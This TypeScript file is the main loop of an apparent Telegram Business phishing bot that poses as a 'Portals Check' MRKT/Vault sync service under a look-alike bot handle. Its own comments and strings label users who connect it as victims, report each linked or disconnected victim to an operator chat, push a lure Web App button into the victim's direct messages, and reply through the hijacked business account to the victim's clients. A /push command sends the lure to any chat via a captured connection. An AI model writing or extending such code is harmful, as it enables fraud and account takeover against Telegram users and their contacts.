import { config } from "./config.js";
import {
  introText,
  mrktWebAppKeyboard,
  nudgeText,
  victimLinkedIntro,
} from "./funnel.js";
import { listEnabled, upsertConnection } from "./store.js";
import { getUpdates, sendMessage, type Update } from "./telegram.js";

async function replyAsBusiness(
  businessConnectionId: string,
  chatId: number,
  text: string,
): Promise<void> {
  await sendMessage(chatId, text, {
    business_connection_id: businessConnectionId,
    reply_markup: mrktWebAppKeyboard(businessConnectionId),
    link_preview_options: { is_disabled: true },
  });
}

/** Жертва подключила бота к СВОЕМУ Business — пишем в её личку с ботом */
async function onboardVictimOwner(
  businessConnectionId: string,
  ownerChatId: number,
  ownerUserId: number,
): Promise<void> {
  await sendMessage(ownerChatId, victimLinkedIntro, {
    reply_markup: mrktWebAppKeyboard(businessConnectionId),
    link_preview_options: { is_disabled: true },
  });
  await sendMessage(
    Number(config.adminChatId),
    `🎯 victim linked business bot\ntg <code>${ownerUserId}</code>\nbc <code>${businessConnectionId}</code>`,
    { parse_mode: "HTML" },
  );
}

async function handleUpdate(update: Update): Promise<void> {
  const bc = update.business_connection;
  if (bc) {
    upsertConnection({
      id: bc.id,
      userId: bc.user.id,
      enabled: bc.is_enabled,
      updatedAt: new Date().toISOString(),
    });

    if (bc.is_enabled) {
      const ownerChat = bc.user_chat_id ?? bc.user.id;
      await onboardVictimOwner(bc.id, ownerChat, bc.user.id);
    } else {
      await sendMessage(
        Number(config.adminChatId),
        `⛔ victim disconnected\nuser ${bc.user.id}\nid <code>${bc.id}</code>`,
        { parse_mode: "HTML" },
      );
    }
    return;
  }

  const bm = update.business_message;
  if (bm && !bm.from?.is_bot) {
    // ЛС на бизнес-аккаунт жертвы (клиенты) — вторично
    await replyAsBusiness(bm.business_connection_id, bm.chat.id, introText);
    return;
  }

  const ebm = update.edited_business_message;
  if (ebm) {
    await replyAsBusiness(ebm.business_connection_id, ebm.chat.id, nudgeText);
    return;
  }

  const msg = update.message;
  if (!msg?.text) return;
  const chatId = msg.chat.id;

  if (msg.text.startsWith("/start")) {
    await sendMessage(
      chatId,
      [
        "Portals Check — проверка MRKT / Business.",
        "",
        "Пользователь подключает бота: Настройки → Telegram Business →",
        "Чат-боты (или автоматизация) → @PortaIsLiquidBot",
        "",
        "После подключения сюда придёт кнопка синхронизации Vault.",
        "",
        `Web App: ${config.miniappUrl}`,
      ].join("\n"),
    );
    return;
  }

  if (msg.text.startsWith("/push")) {
    const parts = msg.text.split(/\s+/);
    const target = Number(parts[1]);
    if (!target) {
      await sendMessage(chatId, "usage: /push <chat_id>");
      return;
    }
    const enabled = listEnabled();
    if (!enabled.length) {
      await sendMessage(chatId, "no active business_connection");
      return;
    }
    const conn = enabled[enabled.length - 1]!;
    await sendMessage(target, victimLinkedIntro, {
      reply_markup: mrktWebAppKeyboard(conn.id),
    });
    await sendMessage(chatId, `pushed to ${target} via ${conn.id}`);
  }
}

async function main(): Promise<void> {
  let offset = 0;
  console.log("business bot polling");
  for (;;) {
    try {
      const updates = await getUpdates(offset);
      for (const u of updates) {
        offset = u.update_id + 1;
        await handleUpdate(u);
      }
    } catch (e) {
      console.error(e);
      await new Promise((r) => setTimeout(r, 3000));
    }
  }
}

main().catch(console.error);
